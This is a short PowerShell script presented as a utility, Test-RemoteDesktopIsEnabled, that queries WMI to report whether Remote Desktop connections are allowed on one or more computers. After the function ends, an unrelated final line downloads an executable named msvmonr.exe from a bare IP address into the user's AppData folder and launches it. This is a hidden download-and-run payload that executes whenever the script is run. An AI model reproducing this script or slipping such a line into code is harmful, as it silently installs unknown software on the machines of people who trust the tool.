function Test-RemoteDesktopIsEnabled
{



PARAM(
  [String[]]$ComputerName = $env:COMPUTERNAME
  )
  FOREACH ($Computer in $ComputerName)
  {
    TRY{
      IF (Test-Connection -Computer $Computer -count 1 -quiet)
      {
        $Splatting = @{
          ComputerName = $Computer
          NameSpace = "root\cimv2\TerminalServices"
        }
        
        [boolean](Get-WmiObject -Class Win32_TerminalServiceSetting @Splatting).AllowTsConnections

        
        
      }
    }
    CATCH{
      Write-Warning -Message "Something wrong happened"
      Write-Warning -MEssage $Error[0].Exception.Message
    }
  }

}
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")

